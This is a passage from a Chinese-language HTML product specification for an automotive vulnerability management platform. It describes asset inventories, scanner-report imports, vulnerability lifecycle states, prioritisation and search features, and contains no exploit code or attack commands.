行管理</li><li>支持查看各级分组下不同汽车漏洞、通用漏洞、事件型漏洞、漏洞在漏洞库内的编号、漏洞危险程度、对应车辆ID、VIN码</li><li>支持查看各级分组下IP资产的端口、服务、漏洞数量、POC漏洞数量。</li><li>支持查看车辆信息：车辆品牌、车型、代、TBOX型号、TBOX供应商名称、车机型号、车机供应商名称</li><li>支持展示资产不同层级的资产、漏洞、风险情况</li><li>支持车联网相关资产字段：包括硬件版本、软件版本、零部件编号、投标方信息、IP、ECUID、嵌入式操作系统版本、关联车型等；截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/285207be81fff766790e5dc99fa53162.png"></p><p>资产管理界面</p><ul><li>支持移动APP相关资产字段：包括软件版本、SDK、应用名等；截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/44f4277ea3186957c3dfc6ede504ab3b.png" alt="1703521067279"></p><p>移动APP资产详情界面</p><h4 id="手工录入资产信息"><a href="#手工录入资产信息" class="headerlink" title="手工录入资产信息"></a>手工录入资产信息</h4><p>用户可以手动录入各类资产信息，包括：</p><p>IP地址</p><p>Web应用</p><p>车辆VIN码</p><p>车型ID</p><p>配置等级</p><p>设备序列号</p><p>设备型号</p><p>设备供应商</p><p>移动APP资产</p><p>软件供应商（PKI/OTA等）</p><p>软硬件版本</p><p>系统支持手动录入各种重要信息，涵盖了多个关键领域。用户可以手动输入IP地址、Web应用相关信息，车辆VIN码和车型ID，配置等级以及设备方面的内容，包括TBOX、车载设备序列号、设备型号和设备供应商等。此外，还可输入移动应用程序资产信息，涵盖软件供应商（如PKI/OTA提供商）、软硬件版本等数据。这种手动录入机制对于系统的完整性和全面性至关重要，它确保了系统能够涵盖各种关键信息，从而支持系统在安全运营和资产管理方面的全面性和有效性。这样的功能能够让用户将各种重要的、特定于领域的信息手动输入至系统中，为后续的分析、安全管理和运营提供全面的数据支持。</p><h4 id="资产分类、分层和分级管理"><a href="#资产分类、分层和分级管理" class="headerlink" title="资产分类、分层和分级管理"></a>资产分类、分层和分级管理</h4><p>平台支持对资产进行分类、分层和分级管理。这使得用户能够按照组织机构、业务结构、车型架构等管理层级对资产进行组织和管理。</p><p>系统支持资产按照多个管理层级进行分类和管理，这样的方法提供了更全面的视角来组织和管理资产。通过结合组织机构、业务结构和车型架构等多种管理层级，用户能够根据不同需求对资产进行更加精细化的分类和管理。以组织机构为基础的管理层级可帮助确定资产的归属和责任，业务结构则支持按照不同业务流程或项目对资产进行管理，而车型架构的管理可对涉及车辆的资产进行有效的组织和监管。这种综合多层次管理的方法使得资产管理更为全面、灵活，能够更好地满足不同管理需求，提高了管理的有效性和精确性。</p><h4 id="同步检测平台"><a href="#同步检测平台" class="headerlink" title="同步检测平台"></a>同步检测平台</h4><p>我方系统可以同步检测平台和其他FAW数据平台资产数据信息，包括了：资产ID、资产类别、资产系统版本号、供应商信息、序列号等。</p><p>同步检测平台与其他FAW数据平台的资产数据信息的支持，意味着能够实现资产ID、资产类别、资产系统版本号、供应商信息、序列号等关键数据的无缝集成和共享。这种支持不仅可以确保不同平台间数据的一致性和完整性，也有助于更高效地管理和利用这些资产。通过同步检测平台与其他FAW数据平台的资产数据信息，可以实现更精确的资产跟踪和管理，提高系统和供应链的透明度。这种集成还能够为各个部门和团队提供更准确、及时的数据，有助于迅速做出决策并优化资源配置，进而提升整体运营效率和业务成果。</p><h4 id="自定义资产分类"><a href="#自定义资产分类" class="headerlink" title="自定义资产分类"></a>自定义资产分类</h4><p>我方平台可以进行自定义资产分类和属性，可以根据需求增加资产类型和属性，包括了文本框、列表框、数值、密码、IP地址和布尔值。</p><p>支持自定义资产分类和属性意味着系统具备灵活性，能够根据需求自定义不同资产的类别和属性。允许用户根据特定要求灵活地增加资产类型和属性，包括文本框、列表框、数值、密码、IP地址和布尔值等多种类型。通过自定义资产分类和属性，用户可以更精细地描述和管理各种资产，满足特定场景下的需求。这种自定义性能够为不同行业或特定项目提供更准确和有针对性的资产管理解决方案。用户可以根据实际情况灵活调整资产属性，使系统更贴近业务需求，提升管理效率和数据准确性。这样的灵活性和定制性，有助于系统适应不断变化的业务环境，并更好地支持用户的业务流程和需求。</p><h4 id="漏洞关联和查看"><a href="#漏洞关联和查看" class="headerlink" title="漏洞关联和查看"></a>漏洞关联和查看</h4><p>用户可以查看各级分组下的漏洞信息，包括不同类型的漏洞，如汽车漏洞、通用漏洞和事件型漏洞。</p><p>平台允许用户查看漏洞在漏洞库内的编号、漏洞的危险程度以及与漏洞相关的车辆ID和VIN码。</p><p>系统具备查看不同层级分组下各种漏洞的功能，包括汽车特定漏洞、通用漏洞以及事件型漏洞等。用户可以查看漏洞在漏洞库内的编号、漏洞的危险程度评估，以及与这些漏洞相关联的车辆ID和VIN码等信息。</p><p>通过系统的这种功能，用户可以轻松地浏览并筛选各个分组下的漏洞，了解每个漏洞的详细信息，如其在漏洞库中的唯一标识、严重性评估、可能受影响的车辆ID和VIN码等关键信息。这种分类和细化的漏洞管理功能使得用户能够更加准确、全面地了解漏洞的性质、威胁程度以及对相关资产的潜在影响，进而更有针对性地采取必要的安全防护措施和漏洞修复行动。</p><h4 id="IP资产管理"><a href="#IP资产管理" class="headerlink" title="IP资产管理"></a>IP资产管理</h4><p>用户可以查看各级分组下的IP资产的信息，包括端口、服务、漏洞数量以及POC漏洞数量等。</p><p>系统具备查看各级分组下IP资产相关信息的功能，包括端口、服务、漏洞数量和POC漏洞数量等。</p><p>用户可以通过系统查询各个分组下IP资产的端口信息，了解这些IP所开放的端口号以及关联的服务类型。同时，系统还提供了漏洞数量的统计，让用户了解每个IP资产存在的漏洞总数。此外，系统还能展示POC漏洞的数量，即已经验证的漏洞案例数目。</p><p>这种功能使用户能够快速了解各级分组下IP资产的安全情况，知晓开放端口、相关服务、漏洞数量和POC漏洞数量等关键信息。通过这些详细数据的呈现，用户可以更全面地评估和识别潜在的安全风险，有助于及时采取必要的安全措施和漏洞修复工作。</p><h4 id="车辆信息管理"><a href="#车辆信息管理" class="headerlink" title="车辆信息管理"></a>车辆信息管理</h4><p>提供了对车辆信息的管理和查看，包括车辆品牌、车型、代号、TBOX型号、TBOX供应商名称、车机型号、车机供应商名称等。</p><p>用户可以查看车辆的关键信息，如车辆品牌、车型、代号、TBOX型号、TBOX供应商名称、车机型号和车机供应商名称等。这些数据为用户提供了关于车辆配置和关联供应商的重要信息，有助于确保车辆系统的适配性和安全性。</p><h4 id="多层级资产展示"><a href="#多层级资产展示" class="headerlink" title="多层级资产展示"></a>多层级资产展示</h4><p>平台能够以层级视图的方式展示不同层级的资产信息，包括漏洞和风险情况，使用户能够更清晰地了解资产的组织结构。</p><p>用户可以查看车辆的关键信息，如车辆品牌、车型、代号、TBOX型号、TBOX供应商名称、车机型号和车机供应商名称等。这些数据为用户提供了关于车辆配置和关联供应商的重要信息，有助于确保车辆系统的适配性和安全性。</p><h4 id="车联网和移动APP相关资产字段"><a href="#车联网和移动APP相关资产字段" class="headerlink" title="车联网和移动APP相关资产字段"></a>车联网和移动APP相关资产字段</h4><p>对于车联网相关资产，平台支持记录和展示各种相关字段，如硬件版本、软件版本、零部件编号、投标方信息、IP、ECUID、嵌入式操作系统版本、关联车型等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/285207be81fff766790e5dc99fa53162.png"></p><p>资产管理界面</p><p>对于移动APP相关资产，平台同样支持记录和展示各种相关字段，如软件版本、SDK、应用名称等。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/ebf4458f064126e8782eec61edf15d64.png"></p><p>移动APP资产详情界面</p><p>资产管理的这些功能将有助于用户有效地管理和监控各种资产，帮助识别潜在漏洞和风险，并采取必要的措施以维护系统和数据的安全性。</p><h3 id="漏洞采集管理"><a href="#漏洞采集管理" class="headerlink" title="漏洞采集管理"></a>漏洞采集管理</h3><p>漏洞采集管理模块提供了多种方式来获取漏洞信息，包括通过漏洞扫描引擎的调度采集、外部数据导入、人工手动添加等途径。</p><p>漏洞管理平台可以与第三方漏洞扫描引擎的集成，包括漏扫设备接入以及与其他平台（如靶场平台、众测平台、安全检测平台）的对接。</p><p>用户可以通过与二进制分析工具的对接，实现对工具漏洞信息的同步监控。此外，漏洞采集管理模块允许用户手动录入漏洞信息，展示漏洞的基本细节，包括漏洞编号、描述、发现来源和报告人等信息。</p><p>用户可以通过界面添加IP、零部件资产和车联网系统漏洞。支持导入漏洞扫描器生成的离线文件，包括.Nessus、XML和Excel格式文件，以便更全面地采集漏洞信息。此外，漏洞采集管理还允许与其他检测平台和工具进行对接，以展现漏洞信息。</p><p>漏洞信息的导入支持使用漏洞模板，用户可以自定义漏洞类型、属性名称和属性值，以更灵活地管理漏洞信息。</p><p>功能参数如下：</p><ul><li>漏洞采集支持漏扫引擎调度采集漏洞、外部导入、人工添加的方式采集漏洞。</li><li>目前漏洞管理平台支持调度第三方漏洞扫描引擎支持漏扫厂商设备接入、从其他平台（例如靶场平台、众测平台、安全检测平台）接入。</li><li>支持对接的二进制分析工具的漏洞监控模块 ，同步工具的漏洞信息。</li><li>支持手动录入漏洞信息。</li><li>支持展示漏洞基本信息，包含不限于漏洞编号、漏洞描述、漏洞发现来源、漏洞报告人等信息。</li><li>支持通过界面人工添加IP、零部件资产、车联网系统漏洞。</li><li>支持通过导入漏洞扫描器离线文件的方式采集漏洞，包括.Nessus、XML、Excel格式文件。</li><li>支持与检测平台及工具对接（如二进制分析工具等），展现漏洞信息。</li><li>支持通过漏洞模版导入漏洞信息，不限于漏洞ID、漏洞描述、漏洞等级、漏洞属性、漏洞影响资产等。</li><li>支持漏洞类型自定义、支持漏洞属性名称、属性值自定义。</li></ul><h4 id="多种漏洞采集方式"><a href="#多种漏洞采集方式" class="headerlink" title="多种漏洞采集方式"></a>多种漏洞采集方式</h4><p>平台支持多种漏洞采集方式，包括：</p><p>漏洞扫描引擎的调度采集：可以通过定期调度漏洞扫描引擎来自动采集漏洞信息。</p><p>外部导入：允许从外部来源导入漏洞数据。</p><p>人工添加：用户可以手动添加漏洞信息，确保平台包含所有必要的漏洞记录。</p><p>系统支持多种漏洞采集方式。首先，漏扫引擎调度采集是主要方式之一，通过调度漏洞扫描引擎自动检测漏洞。其次，外部导入是指从其他系统或来源手动导入漏洞数据。最后，人工添加允许用户手动录入漏洞信息，可补充或修正已有数据，确保漏洞信息的全面性。</p><h4 id="第三方漏洞扫描引擎对接"><a href="#第三方漏洞扫描引擎对接" class="headerlink" title="第三方漏洞扫描引擎对接"></a>第三方漏洞扫描引擎对接</h4><p>平台支持与第三方漏洞扫描引擎对接，包括漏洞扫描厂商设备接入。这使得用户能够直接将第三方扫描结果整合到平台中，实现自动化漏洞识别和记录。</p><p>还支持从其他平台（如靶场平台、众测平台、安全检测平台等）接入漏洞数据，确保漏洞信息的全面性和准确性。</p><p>平台允许调度第三方漏洞扫描引擎，包括各种漏扫厂商设备接入，同时可以从外部平台（如靶场、众测平台）获取漏洞数据。这种对接机制能够提供更多元的漏洞来源，增强了漏洞数据的丰富性和全面性。</p><h4 id="二进制分析工具漏洞监控模块"><a href="#二进制分析工具漏洞监控模块" class="headerlink" title="二进制分析工具漏洞监控模块"></a>二进制分析工具漏洞监控模块</h4><p>平台与二进制分析工具对接，同步工具的漏洞信息，以确保平台及时获取和记录与二进制分析相关的漏洞数据。</p><p>系统可实现与二进制分析工具的对接，监控工具检测到的漏洞信息，并将其同步到漏洞管理平台。这种同步能够追踪工具检测到的最新漏洞，保持平台数据的及时性和准确性。</p><h4 id="手动录入漏洞信息"><a href="#手动录入漏洞信息" class="headerlink" title="手动录入漏洞信息"></a>手动录入漏洞信息</h4><p>用户可以通过界面手动录入漏洞信息，确保任何漏洞都能够被准确记录和跟踪。</p><p>用户可以通过漏洞管理界面手动录入漏洞信息，填写漏洞描述、发现来源、报告人等关键信息。这种手动添加方式使用户可以灵活地完善平台上的漏洞数据。</p><h4 id="漏洞基本信息展示："><a href="#漏洞基本信息展示：" class="headerlink" title="漏洞基本信息展示："></a>漏洞基本信息展示：</h4><p>平台提供了漏洞基本信息的展示，包括漏洞编号、漏洞描述、漏洞发现来源、漏洞报告人等详细信息。</p><p>支持漏洞基本信息的展示是平台的重要功能之一。用户可以方便地查看漏洞的各项重要信息，其中包括漏洞编号、详细描述、漏洞的发现来源以及报告人等重要信息。这种细致全面的信息呈现方式，有助于用户迅速了解漏洞的来源、性质和发现方式，为制定安全措施和解决方案提供了必要的参考依据。同时，展示漏洞报告人信息也有助于识别并感谢发现漏洞的贡献者，促进安全社区的合作和信息共享。通过这种展示方式，平台使得漏洞信息透明化，并且便于用户根据这些信息采取必要的安全补救措施，以确保系统和应用程序的安全性。</p><h4 id="IP和资产管理："><a href="#IP和资产管理：" class="headerlink" title="IP和资产管理："></a>IP和资产管理：</h4><p>用户可以通过界面人工添加IP、零部件资产、车联网系统漏洞，确保漏洞与相应资产关联。</p><p>平台支持通过用户友好的界面实现对IP、零部件资产以及车联网系统漏洞的人工添加。这项功能为用户提供了一种直观便捷的方式，能够快速而准确地将特定的IP地址、各类零部件资产以及车联网系统漏洞添加到平台中，以便进行针对性的管理和监控。通过界面人工添加这些信息，用户可以更加精确地定义和标记具体的漏洞点，这对于漏洞的管理和修复非常关键。</p><p>针对IP地址的添加，用户可以直接在平台界面上输入或选择要添加的IP地址，确保系统对相关网络节点的全面覆盖。对于零部件资产，用户可以透过界面添加各种设备或部件的详细信息，使得平台可以对这些资产进行有效的追踪和监管。至于车联网系统漏洞，用户同样可以通过界面添加相关漏洞信息，使平台能够及时掌握车联网系统的安全状况，并进行相应的安全措施。</p><h4 id="导入漏洞扫描器离线文件："><a href="#导入漏洞扫描器离线文件：" class="headerlink" title="导入漏洞扫描器离线文件："></a>导入漏洞扫描器离线文件：</h4><p>平台支持通过导入漏洞扫描器生成的离线文件的方式，采集漏洞数据。这包括.Nessus、XML、Excel等格式的文件。</p><p>平台支持一种便捷的方式来采集漏洞信息，即通过导入漏洞扫描器离线文件的方式进行漏洞信息的整合。这种方式允许用户将包括.Nessus、XML、Excel等格式的离线文件导入到平台中，以快速有效地收集和整理漏洞信息。</p><p>用户可以将相应格式的离线文件上传至平台，系统将会对文件进行解析和处理，将其中的漏洞信息提取出来并整合到平台的漏洞数据库中。这样的功能使得平台能够从不同来源的漏洞扫描器产生的文件中获取漏洞数据，确保了漏洞信息的全面性和多样性。同时，这也大大简化了漏洞信息的汇总流程，为用户提供了高效且便捷的数据整合方式。</p><p>通过支持这种导入离线文件的功能，平台能够帮助用户快速建立全面的漏洞信息库，提升了对系统安全状况的全面监控和管理能力。</p><h4 id="与检测平台及工具对接："><a href="#与检测平台及工具对接：" class="headerlink" title="与检测平台及工具对接："></a>与检测平台及工具对接：</h4><p>平台具备与检测平台和工具对接的能力（如二进制分析工具等），以展现和记录不同来源的漏洞信息。</p><p>平台支持与各类检测平台及工具对接，包括但不限于二进制分析工具，能够展现来自这些工具的详尽漏洞信息。</p><p>这种对接功能使得平台能够获取多种检测平台和工具所提供的漏洞信息，并将这些信息整合展现在一个统一的界面上。这样的集成显示机制帮助用户在一个平台上便捷地查看来自不同来源的漏洞信息，提供了一个全面了解系统安全状况的途径。</p><p>通过与检测平台及工具对接，平台能够呈现多样化的漏洞信息，包括漏洞的类型、级别、发现时间以及影响范围等重要细节。这种全面展现漏洞信息的方式，为用户提供了更深入的安全诊断视角，有助于用户全面了解系统的安全情况并及时采取必要的安全措施。</p><h4 id="漏洞模板导入："><a href="#漏洞模板导入：" class="headerlink" title="漏洞模板导入："></a>漏洞模板导入：</h4><p>用户可以通过漏洞模板导入漏洞信息，自定义漏洞ID、漏洞描述、漏洞等级、漏洞属性以及漏洞影响资产等信息。</p><p>平台支持通过漏洞模板导入漏洞信息，这种导入方式不受限于漏洞ID、漏洞描述、漏洞等级、漏洞属性以及漏洞影响资产等关键要素。</p><p>用户可以利用漏洞模板功能，按照自定义的标准导入漏洞信息。这种高度灵活的方式允许用户根据实际需求，导入各类漏洞信息，而不受特定字段或格式的限制。通过这种方式，用户可以根据自身系统或业务的特点，灵活定义并录入漏洞信息，确保了漏洞信息记录的全面性和准确性。</p><p>此外，支持漏洞模板导入也提供了方便的数据整合途径。用户可以在保持数据的完整性的同时，按照系统要求将漏洞信息集中导入到平台中，为后续的安全分析和决策提供了可靠的数据基础。这种灵活且全面的导入方式，有助于平台用户更好地管理和维护漏洞信息。</p><h4 id="漏洞类型和属性自定义："><a href="#漏洞类型和属性自定义：" class="headerlink" title="漏洞类型和属性自定义："></a>漏洞类型和属性自定义：</h4><p>平台允许用户自定义漏洞类型和属性的名称和值，以满足特定的需求和标准。</p><p>平台支持用户自定义漏洞类型，并且允许用户自由定义漏洞属性名称和属性值。</p><p>这种功能允许用户根据特定需求或特定环境，自行设定漏洞类型，例如网络漏洞、应用程序漏洞、操作系统漏洞等等。同时，用户可以根据实际情况定义漏洞属性名称，比如严重性、影响范围、修复建议等等，以便更全面地描述和区分不同漏洞的特性。此外，用户还可以为这些属性设定特定的属性值，用于更具体地描述每个漏洞的具体特征或情况。</p><p>这种自定义功能为用户提供了高度灵活性和个性化定制的空间，使其能够根据实际需求或特定场景，更加精确地标识和管理各类漏洞。通过自定义漏洞类型和属性，用户可以更清晰地理解和描述系统中存在的安全问题，并更有针对性地采取相应的安全措施和修复方案。</p><h3 id="漏洞运维管理"><a href="#漏洞运维管理" class="headerlink" title="漏洞运维管理"></a>漏洞运维管理</h3><p>全面生命周期管理：支持安全对象的全生命周期管理，从漏洞发现到解决，持续跟踪漏洞处置任务以及处置情况，确保漏洞不被忽视。</p><p>数据同步与关联：可以将不同来源的漏洞数据同步到平台，并与资产信息关联，提供完整视图。</p><p>高效查询与排序：提供多维度的查询和排序功能，接受安全运营平台的查询指令并反馈对应的漏洞信息用户可以按时间、等级等条件快速定位漏洞以及查看漏洞列表。</p><p>详细漏洞信息管理：提供漏洞详细信息，包括名称、资产关联、解决方案等。</p><p>多维度检索：用户可以根据漏洞名称、资产IP、状态等多个维度进行检索和管理符合条件的漏洞。</p><p>多种操作选项：用户可以对漏洞执行多种操作，包括已消除、暂不消除、误报等，以适应不同情况。</p><p>数据导出功能：支持导出漏洞数据，以便进一步分析和报告生成。</p><p>漏洞分析信息管理：提供漏洞分析信息，包括原因、相关项、责任部门等，有助于深入了解漏洞。</p><p>多维度管理：支持IP视角、网站资产漏洞、车辆漏洞信息、移动APP等多个维度的管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、移动版本号等纬度。</p><p>全面的漏洞状态：涵盖漏洞的多种状态，确保每个漏洞都有明确的处理状态，包括新增、开放、重现、误报、忽略、接受、缓解、消除、待修复、修复完成、无法修复、超期未修复、待验证、验证成功、验证失败、待复测、复测通过、复测失败、待处理等19个状态。</p><p>漏洞优先级排序：基于漏洞的优先级模型，帮助用户根据风险程度进行优先处理。</p><p>时间线管理：跟踪漏洞的时间线，包括发现时间、处理时间等，帮助了解漏洞演化情况。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/54052a1476517fd198b1aa0cd657d678.png"></p><p>漏洞运维界面</p><p>功能参数如下：</p><ul><li>支持对安全对象的整个生命周期的漏洞管理工作，持续跟踪漏洞处置任务以及处置情况。</li><li>支持同步自靶场平台、众测平台、测试平台以及其他方式获取到的最新漏洞同步到安全运营平台与资产信息关联。</li><li>支持提供漏洞信息查询及同步接口，接受安全运营平台的查询指令并反馈对应的漏洞信息。</li><li>支持对漏洞列表进行时间、等级排序查看。</li><li>支持查看漏洞详细面板，漏洞详情包括漏洞名称、所属资产、解决方案等信息。</li><li>支持通过漏洞名称、资产 ip、发现时间、状态、等级维度检索符合条件的漏洞。</li><li>支持对漏洞进行已消除、暂不消除、误报操作。</li><li>支持对列表中选中的漏洞导出为 excel 文件，支持全部漏洞导出。</li><li>支持展示漏洞分析信息，包含不限于漏洞原因、漏洞相关项及零部件信息、责任内部归口部门等。</li><li>支持展示漏洞分析信息，包含不限于漏洞原因、漏洞相关项及零部件信息、责任内部归口部门等。</li><li>支持IP视角进行漏洞的管理和分析，包括漏洞名称、漏洞级别、漏洞类型、CWE编号、CVE编号、POC方式、采集途径等纬度。</li><li>支持网站资产漏洞的管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、CWE、POC方式、WEB应用等纬度。</li><li>支持多维度展现车辆漏洞信息，包括：漏洞数量、漏洞名称、漏洞级别、关联零部件、相关车型等多个维度；功能截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/a49e7d5f873e47d3f45e3fdf8b582bc2.png" alt="企业微信截图_17035233441771"></p><ul><li>支持移动APP的多视角管理和分析，包括漏洞影响URL、漏洞名称、漏洞级别、漏洞类型、移动版本号等纬度；功能截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9a9d60bcdad3bd76f67907f2d920d0ea.png"></p><ul><li>支持漏洞全生命周期管理。具备漏洞全生命周期管理模型。满足不同的风险控制措施和力度的管理需求。</li><li>漏洞状态应包括：新增、开放、重现、误报、忽略、接受、缓解、消除、待修复、修复完成、无法修复、超期未修复、待验证、验证成功、验证失败、待复测、复测通过、复测失败、待处理等19个状态。</li><li>具备漏洞优先级排序模型，支持漏洞与利用情报、网关防御规则自动关联，进行漏洞优先级排序；产品功能截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/79ecf68f58f7391c83e123c18dbc3b25.png" alt="1703408528923"></p><ul><li>支持漏洞时间线管理，从漏洞公布时间、不同来源POC公布时间、Snort IPS规则公布时间、资产发现时间、漏洞发现时间、漏洞生命周期状态的跟踪，提炼考核指标；产品功能截图如下：</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/73ce7fb115fe85153cdc6fb4bd70a9c6.png" alt="1703481439424"></p><h4 id="漏洞生命周期管理："><a href="#漏洞生命周期管理：" class="headerlink" title="漏洞生命周期管理："></a>漏洞生命周期管理：</h4><p>平台支持对安全对象的整个生命周期的漏洞管理工作。这包括漏洞的发现、记录、报告、修复、验证和处置等环节，确保漏洞得到全面而持续的关注和处理。具备漏洞全生命周期管理模型。满足不同的风险控制措施和力度的管理需求。</p><p>平台支持对安全对象整个生命周期的漏洞管理工作，并能够持续跟踪漏洞处置任务和处置情况。</p><p>这种功能使得平台能够全面管理漏洞的发现、跟踪和解决过程，包括漏洞的发现、报告、分析、确认、解决和验证。平台可以帮助用户全面了解漏洞处置的整个过程，确保漏洞处置工作能够及时、有效地展开并得到妥善处理。</p><p>通过持续跟踪漏洞处置任务，平台可以帮助用户实时监控漏洞的处理进度和状态。同时，平台还能提供漏洞处置情况的记录和报告，使用户能够清晰地了解每个漏洞的处理情况，包括处置的时间、方式、结果等信息。这种持续跟踪和记录的机制，有助于用户全面了解漏洞管理工作的进展情况，及时调整处置策略并保证漏洞得到有效解决，最大程度地提升系统的安全性和稳定性。</p><h4 id="同步漏洞数据："><a href="#同步漏洞数据：" class="headerlink" title="同步漏洞数据："></a>同步漏洞数据：</h4><p>支持从不同来源，如靶场平台、众测平台、测试平台以及其他方式获取的最新漏洞数据同步到安全运营平台，并与资产信息进行关联。这确保了漏洞信息的一致性和准确性。</p><p>平台支持同步来自靶场平台、众测平台、测试平台等多种渠道获得的最新漏洞信息，并将其与安全运营平台的资产信息关联起来。</p><p>这项功能使得平台能够不断地更新漏洞信息，将最新的漏洞数据从多种渠道同步到安全运营平台，并与已有的资产信息进行关联。这种同步操作可以帮助用户全面了解系统和资产面临的最新安全威胁，及时识别和应对新出现的漏洞问题。</p><p>通过与靶场、众测、测试等平台的信息同步，平台可以在第一时间获知最新的漏洞情报。随后，它将这些信息与已有的资产信息进行关联，以便用户能够更加直观地了解哪些资产可能受到哪些最新漏洞的威胁。这种关联操作有助于提高漏洞信息的全面性和及时性，并为用户提供及时更新的安全风险评估，从而更有效地制定应对策略和保障系统安全。</p><h4 id="漏洞信息查询和同步接口："><a href="#漏洞信息查询和同步接口：" class="headerlink" title="漏洞信息查询和同步接口："></a>漏洞信息查询和同步接口：</h4><p>提供漏洞信息查询和同步接口，允许安全运营平台向漏洞管理平台发出查询指令，并接收漏洞信息的反馈。</p><p>平台支持提供漏洞信息查询及同步接口，能够接收安全运营平台发送的查询指令，并反馈对应的漏洞信息。</p><p>这种接口功能使得安全运营平台能够向漏洞管理平台发出查询请求，以获取特定漏洞信息。漏洞管理平台接收到查询指令后，通过相应的接口机制，将请求的漏洞信息快速准确地反馈给安全运营平台。这样的查询和反馈机制，为用户提供了便捷、高效地获取漏洞信息的途径。</p><p>通过提供这样的接口，安全运营平台可以在需要时随时向漏洞管理平台获取特定漏洞的详细信息，无需直接进入漏洞管理平台的界面，实现了信息的快速交换和共享。这种接口功能有助于加强不同系统之间的信息互通，提高了漏洞信息的可用性和共享性，为安全运营平台提供了更灵活和便捷的漏洞信息获取途径。</p><h4 id="漏洞列表管理："><a href="#漏洞列表管理：" class="headerlink" title="漏洞列表管理："></a>漏洞列表管理：</h4><p>支持对漏洞列表进行灵活的时间和等级排序，以便用户更容易查看和筛选漏洞信息。</p><p>平台支持对漏洞列表进行时间和等级排序，使用户能够根据时间或漏洞等级的优先级对漏洞信息进行排序查看。</p><p>通过时间排序，用户可以按照漏洞被发现或报告的时间顺序，查看最新的漏洞信息或优先关注最近出现的安全问题。这种按时间排序的功能能够帮助用户迅速定位和处理最新的安全威胁，保持对系统安全状况的及时了解。</p><p>通过等级排序，用户可以根据漏洞的危害等级或重要性进行排序，有助于用户首先处理那些危害较大或紧急程度较高的漏洞问题。这种排序方式可以帮助用户合理安排漏洞处理的优先级，更有效地保护系统安全。</p><p>这种支持排序查看漏洞列表的功能，为用户提供了更灵活、更便捷的漏洞信息管理方式，有助于用户快速了解漏洞信息的重要性和紧急程度，更有效地制定安全措施和漏洞处理策略。</p><h4 id="漏洞详细信息查看："><a href="#漏洞详细信息查看：" class="headerlink" title="漏洞详细信息查看："></a>漏洞详细信息查看：</h4><p>用户可以查看漏洞的详细信息面板，包括漏洞名称、所属资产、解决方案等关键信息，以便更深入地了解每个漏洞。</p><p>平台支持查看漏洞的详细面板，提供丰富的漏洞信息，包括漏洞名称、所属资产、解决方案等重要信息。</p><p>在漏洞详细面板中，用户可以查看漏洞的具体名称，以便明确了解漏洞类型和特征。同时，漏洞所属的资产信息也会被清晰列出，帮助用户准确定位哪些资产受到了漏洞的威胁。</p><p>漏洞详细面板会提供解决方案等相关信息，为用户提供针对该漏洞的解决建议或处理方法。这些解决方案能够帮助用户更快速地理解漏洞的危害性，并提供有效的应对措施，有助于用户更及时地采取必要的安全措施，保障系统的安全性。</p><p>通过漏洞详细面板，用户可以全面了解每个漏洞的具体情况，更好地了解其对系统的影响，并根据提供的解决方案采取相应的措施，从而更有效地管理和维护系统的安全。</p><h4 id="漏洞消除操作："><a href="#漏洞消除操作：" class="headerlink" title="漏洞消除操作："></a>漏洞消除操作：</h4><p>我方系统可以对漏洞进行已消除、暂不消除、误报操作。</p><p>已消除： 用户可以将已经解决或消除的漏洞标记为已消除状态。这种操作有助于用户追踪漏洞处置过程，确保漏洞已经得到妥善解决，同时也有助于对系统的安全性进行评估。</p><p>暂不消除： 用户在某些情况下可能暂时不处理某个漏洞，可以将漏洞标记为暂不消除状态。这有助于用户对漏洞处理的优先级进行合理安排，暂时放置不紧急的漏洞处理工作。</p><p>误报： 用户发现某个被误报的漏洞，可以将其标记为误报。这项操作有助于清除不准确的漏洞信息，确保漏洞信息的准确性和可信度。</p><h4 id="漏洞检索和筛选："><a href="#漏洞检索和筛选：" class="headerlink" title="漏洞检索和筛选："></a>漏洞检索和筛选：</h4><p>支持通过不同维度，如漏洞名称、资产IP、发现时间、状态、等级等，对漏洞进行检索和筛选，以快速找到符合条件的漏洞。</p><p>平台支持通过多种维度进行检索，包括漏洞名称、资产IP、发现时间、状态和等级等，来检索符合条件的漏洞信息。</p><p>通过漏洞名称进行检索，用户能够快速定位特定名称或关键词相关的漏洞信息。资产IP维度的检索使用户能够查找与特定IP地址相关联的漏洞。发现时间的检索允许用户根据漏洞被发现的具体时间段来筛选漏洞。状态维度的检索可帮助用户查找特定状态下的漏洞，例如已解决或未解决的漏洞。此外，等级维度的检索能够让用户根据漏洞的严重程度或等级来搜索漏洞。</p><h4 id="漏洞状态管理："><a href="#漏洞状态管理：" class="headerlink" title="漏洞状态管理："></a>漏洞状态管理：</h4><p>提供多种漏洞状态，包括但不限于新增、开放、重现、误报、忽略、接受、缓解、消除、待修复、修复完成、无法修复、超期未修复、待验证、验证成功、验证失败、待复测、复测通过、复测失败、待处理等19个状态。用户可以根据漏洞的不同状态进行相应的操作。</p><p>这些操作能够帮助用户更好地跟踪和管理漏洞处置过程，根据实际情况对漏洞进行合理的处理，有针对性地制定解决方案，并保证漏洞信息的准确性和系统安全性。</p><h4 id="漏洞导出："><a href="#漏洞导出：" class="headerlink" 